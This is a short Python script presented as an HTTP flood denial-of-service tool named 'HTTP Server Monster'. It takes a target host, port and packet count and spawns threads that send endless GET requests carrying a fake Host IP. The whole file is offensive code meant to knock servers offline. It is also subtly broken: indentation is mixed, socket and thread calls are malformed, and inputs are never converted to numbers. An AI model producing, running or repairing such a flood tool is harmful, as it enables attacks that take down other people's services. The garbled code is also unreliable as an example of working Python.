#!/usr/bin/python
# (C) Atomic

# Modules
import os
import socket
import threading

# Banner
bnner = """
 _   _  ________  ___
| | | |/  ___|  \/  |
| |_| |\ `--.| .  . |
|  _  | `--. \ |\/| |
| | | |/\__/ / |  | |
\_| |_/\____/\_|  |_/
                     
                             
-- HTTP Server Monster --
   Author : atomic
   Github : https://github.com/atom1clhu
   Version : 0.1
"""

# Functions
print(bnner)
ip = input("Hostname/IP : ")
port = input("Port : ")
pck = input("Packets : ")

# Attack
fake_ip = '182.21.20.32'
attack_num = 0

def attack():
	while True:
		sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sc.connect(ip, port)
		sc.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
        sc.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
        
        global attack_num
        attack_num += 1
        print(f'[{attack_num}] - HSM is ATTACKING! Target {ip} in port {port} with packets {pck}')
        
        sc.close()

for i in range(pck):
    thread = threading.Thread(ip=attack)
    thread.start()

